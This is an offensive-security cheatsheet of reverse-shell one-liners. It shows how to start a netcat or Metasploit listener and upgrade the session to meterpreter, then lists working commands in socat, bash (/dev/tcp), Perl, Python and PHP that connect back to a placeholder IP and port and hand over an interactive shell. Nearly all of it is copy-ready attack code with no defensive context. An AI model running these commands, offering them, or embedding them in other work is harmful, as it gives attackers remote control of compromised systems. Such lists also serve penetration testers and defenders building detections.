# Cheatsheet for Reverse-shell one-liner

## Table of contents
1. [Bash](#bash)
2. [Perl](#perl)
3. [Python](#python)
4. [PHP](#php)

## Spawn a handler
### Netcat
```bash
nc -lvp <PORT>
```

### Metasploit
```bash
msf5 > use exploit/multi/handler
msf5 > set PAYLOAD <Payload name>
msf5 > set LHOST <LHOST value>
msf5 > set LPORT <LPORT value>
msf5 > set ExitOnSession false
msf5 > exploit -j -z
```
Shell will be spawn as a background session. You can then upgrade to meterpreter using another handler :
```bash
msf5 > use post/multi/manage/shell_to_meterpreter
msf5 > set SESSION <SESSION_ID>
msf5 > exploit
```

## Reverse-shell one-liner
### Socat
Full interactive shell !!!
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
```

### Bash <a name="bash"></a>
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```
```bash
exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
```
```bash
exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
```
```bash
0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
```

### Perl <a name="perl"></a>
Version dépendante de « /bin/sh » :
```bash
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Version indépendante de « /bin/sh » pour Linux (avec fork) :
```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```bash
php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```bash
php -r '$s=fsockopen("<IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```
```bash
php -r '$s=fsockopen("<IP>",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'
```
```bash
php -r '$s=fsockopen("<IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
```
```bash
php -r '$s=fsockopen("<IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```